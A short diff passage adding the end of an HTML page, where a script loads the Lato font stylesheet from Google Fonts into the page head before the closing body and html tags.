+        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";
+
+        customFont.type = "text/css";
+        customFont.rel = "stylesheet";
+
+        document.head.appendChild(customFont);
+    }());
+</script>
+
+    </body>
+</html>
